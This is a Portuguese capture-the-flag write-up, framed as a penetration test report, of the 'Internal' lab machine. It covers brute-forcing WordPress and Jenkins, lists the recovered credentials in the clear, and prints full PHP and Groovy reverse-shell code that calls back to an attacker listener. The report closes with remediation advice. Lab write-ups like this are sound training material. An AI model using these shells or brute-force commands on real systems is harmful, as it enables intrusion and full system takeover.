
Relatório de Teste de Penetração

Introdução do caso:

Fui atribuído a um cliente que solicitou a realização de um teste de penetração em um ambiente que será disponibilizado para produção em três semanas. O objetivo é identificar vulnerabilidades que possam comprometer a segurança do ambiente antes de sua publicação.



Escopo do Trabalho

O cliente solicitou que a avaliação fosse realizada considerando a perspectiva de um agente mal-intencionado, utilizando metodologia de caixa preta (black-box). As permissões fornecidas para o escopo incluíram:



Modificar o arquivo hosts local para refletir o link: internal.thm.

Utilização livre de quaisquer ferramentas ou técnicas.

Localizar e documentar todas as vulnerabilidades encontradas.

Submissão dos sinalizadores user.txt e root.txt.

Apenas o endereço IP da máquina atribuída está dentro do escopo.

Roleplay desabilitado.



O cliente também incentivou que este desafio fosse conduzido como um teste de penetração real, com elaboração de um relatório contendo: resumo executivo, análise de vulnerabilidades, detalhamento das explorações realizadas e sugestões de correção.



Reconhecimento Inicial

O reconhecimento da rede foi iniciado com o comando:

nmap -Pn -A <IP-alvo>



Este escaneamento furtivo e agressivo revelou as seguintes portas abertas:

22/tcp: Serviço SSH

80/tcp: Serviço HTTP (Apache2 HTTPD versão 2.4.29 - Ubuntu)



Ao acessar http://<IP-alvo>/:80, a resposta foi a página padrão de apresentação do Apache2.



Enumeração de Diretórios

Utilizei o gobuster para descobrir diretórios ocultos do site:

gobuster dir -u http://<IP-alvo>/ -w /usr/share/WordList/dirb/common.txt



Os seguintes caminhos foram identificados:

http://<IP-alvo>/blog/

http://<IP-alvo>/javascript/

http://<IP-alvo>/phpmyadmin/

http://<IP-alvo>/wordpress/

Notavelmente, /phpmyadmin/ e /wordpress/ apresentaram possibilidade de ataque por força bruta.



Ataque ao WordPress

Detectado que /blog era um WordPress, realizei ataque de força bruta com:

wpscan --url http://internal.thm/wordpress/ --password /usr/share/WordList.rockyou.txt --usernames admin --max-threads 60



Credenciais expostas com o ataque:

Usuário: admin

Senha: my2boys



Durante a análise do painel WordPress, encontrei um post privado contendo:

"

Don't forget to reset Wills credentials. 

william:arnold147

"



Na guia "Aparência", observei que os temas Twenty Nineteen e Twenty Twenty estavam desatualizados. Substituí arquivos do tema por um reverse shell em PHP:



<?php

// php-reverse-shell - Uma implementação de Reverse Shell em PHP

$ip = '127.0.0.1'; // IP do atacante

$port = 1234;  // Porta de escuta

$shell = '/bin/sh -i';

$sock = fsockopen($ip, $port);

$proc = proc_open($shell, [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes);

stream_set_blocking($pipes[0], 0);

stream_set_blocking($pipes[1], 0);

stream_set_blocking($pipes[2], 0);

stream_set_blocking($sock, 0);

while (1) {

 fwrite($pipes[0], fread($sock, 2048));

 fwrite($sock, fread($pipes[1], 2048));

 fwrite($sock, fread($pipes[2], 2048));

}

?>



Com o Netcat escutando, bastou acessar a página contendo o shell para obter acesso remoto como www-data.



Exploração Local e Coleta de Credenciais

Com acesso como www-data, executei:

whoami

ls -la

pwd

cd /opt

cat wp-save.txt



Credenciais encontradas:

aubreanna:bubb13guM!@#123



Confirmei a existência do usuário via:

cat /etc/passwd



Acesso via SSH como Usuário Aubreanna

ssh aubreanna@<IP-alvo>



Autenticação bem-sucedida com a senha acima. 



Identifiquei:

ls -la

cat user.txt {primero objetivo completo}

cat jenkins.txt



O arquivo jenkins.txt indicava:

"Internal Jenkins service is running on IP:8080"



Tunelamento SSH para Jenkins



Criei um tunnel SSH:

ssh -L 1234:<ip>:8080 aubreanna@internal.thm



Acessando http://<ip>:1234, obtive a interface de login do Jenkins.





Força Bruta no Jenkins



Ataque com Hydra:

sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 1234 -V -t 64 -f \http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"



Credenciais obtidas com o ataque usando hydra:

Usuário: admin

Senha: spongebob



Execução de Shell Reverso via Jenkins



Utilizando o console Groovy do Jenkins, executei:

String host="<meu-ip>"; int port=5555; String cmd="sh";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();

Socket s=new Socket(host,port);

InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();

OutputStream po=p.getOutputStream(), so=s.getOutputStream();

while(!s.isClosed()) {

 while(pi.available()>0) so.write(pi.read());

 while(pe.available()>0) so.write(pe.read());

 while(si.available()>0) po.write(si.read());

 so.flush(); po.flush(); Thread.sleep(50);

 try {p.exitValue(); break;} catch (Exception e){}

}; p.destroy(); s.close();



Shell reverso estabelecido com sucesso, onde novamente deixei o Nat Cat ativo em minha maquina para o acesso.





Escalada de Privilégio para Root



Dentro de /opt/note.txt, identifiquei:

"Will wanted these credentials secure behind the Jenkins container...

root:tr0ub13gum!@#123"



Acesso root via SSH:

ssh root@<IP-alvo>





Sinalizadores Capturados

user.txt: obtido com usuário aubreanna

root.txt: obtido após acesso como root



Considerações Finais

O ambiente avaliado apresentou vulnerabilidades críticas desde serviços expostos, credenciais fracas, uso de software desatualizado e falta de isolamento de aplicações internas. Todas as etapas demonstraram caminhos reais de comprometimento total da máquina.



Recomenda-se:

Atualização de CMS e plugins.

Uso de senhas robustas e autenticação multifator.

Isolamento de serviços internos.

Monitoramento de logs e tentativas de login.

Auditoria periódica de aplicações e serviços.

